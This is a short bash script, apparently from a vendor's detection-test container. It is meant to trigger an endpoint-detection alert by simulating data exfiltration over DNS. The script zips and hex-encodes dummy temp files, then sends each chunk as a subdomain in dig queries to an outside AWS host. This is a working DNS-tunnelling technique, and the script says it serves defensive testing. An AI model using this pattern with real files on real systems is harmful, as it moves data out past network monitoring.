# Script will attempt to exfiltrate fake data using alternate channels (i.e DNS).
# It should trigger an anomaly in your EDR tool.
#
# Source - https://raw.githubusercontent.com/CrowdStrike/detection-container/main/bin/Exfiltration_via_Exfiltration_Over_Alternative_Protocol.sh
#

#!/bin/bash

echo -e "\e[92mExecuting Exfiltration Over Alternative Protocol using a DNS tool sendng requests to large domain names. This will take a moment to execute..." 

cd /tmp
touch {1..7}.tmp
zip -qm - *tmp|xxd -p >data
for dat in `cat data `; do dig $dat.legit.term01-b-449152202.us-west-1.elb.amazonaws.com; done > /dev/null 2>&1
rm data
